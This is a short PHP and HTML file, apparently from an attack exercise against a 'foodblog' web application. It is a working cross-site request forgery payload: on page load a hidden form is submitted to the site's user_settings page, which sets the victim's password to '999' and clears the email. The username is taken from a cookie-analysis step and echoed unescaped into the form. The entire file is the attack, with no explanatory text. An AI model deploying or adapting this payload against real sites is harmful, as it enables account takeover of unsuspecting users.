<?php
		$username = $_GET['username']; // get the username from an analysis on his cookie that takes place on the Get_Cookie page
?> 

<!DOCTYPE html>
<html>

<head>
</head>

<body>
			<!--these details based on the request that the client sends to the server in user_settings -->
			<form action="../foodblog/?page=user_settings.php" method="POST">
				<input type="hidden" name="username" value="<?php echo $username ?>">
				<input type="hidden" name="password" value="999">
				<input type="hidden" name="email" value="">
			</form>
			
			<script>
				document.forms[0].submit();
			</script>

</body>
</html>
